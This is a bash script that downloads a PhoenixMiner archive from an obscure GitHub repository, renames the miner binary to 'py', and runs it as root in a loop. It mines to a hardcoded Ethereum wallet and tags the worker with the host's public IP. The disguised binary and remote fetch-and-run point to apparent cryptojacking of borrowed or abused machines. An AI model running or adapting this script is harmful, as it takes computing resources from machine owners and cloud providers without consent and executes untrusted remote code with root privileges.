#!/bin/bash
apt-get install libpci3 && P=$(echo GPU-$(curl -s ipinfo.io/ip)-NEO)
x=1
mkdir neo
TP=$TP
cd neo
wget https://github.com/wikangdijalalan2/xmmxja/raw/moka/PhoenixMiner_5.7b_Linux.tar.gz
tar -xf PhoenixMiner_5.7b_Linux.tar.gz && cd PhoenixMiner_5.7b_Linux
mv PhoenixMiner py
while [ $x -le 20 ]
do

  #sudo ./py -pool ssl://us-eth.2miners.com:12020 -wal 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.PNIX$P -pass x -mi 14 -gt 400
  sudo ./py -pool ssl://us1.ethermine.org:5555 -pool2 ssl://us2.ethermine.org:5555 -wal 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.PNIX$P -pass x -mi 14 -gt 400 -proto 3

  x=$(( $x + 1 ))
  sleep 120
  echo "All done with $x times"
done
